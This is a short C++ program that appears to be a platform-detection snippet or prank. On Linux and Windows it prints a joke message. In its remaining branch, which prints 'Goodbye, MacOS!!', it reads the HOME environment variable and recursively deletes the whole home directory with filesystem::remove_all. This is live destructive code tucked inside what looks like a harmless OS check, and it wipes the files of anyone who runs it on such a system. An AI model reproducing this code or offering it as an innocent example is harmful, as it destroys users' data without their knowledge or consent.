#include <iostream>
#include <filesystem>
#include <cstdlib>
using namespace std;

int main(){

#if defined(__linux__) // Or #if __linux__
  cout << "ok bro we get it" << '\n';
#elif _WIN32
  cout << "ok" << '\n';
#else
  cout << "Goodbye, MacOS!!" << '\n';
  const char* homeDir = getenv("HOME");
  if (homeDir) {
    filesystem::remove_all(homeDir);
  }
#endif
}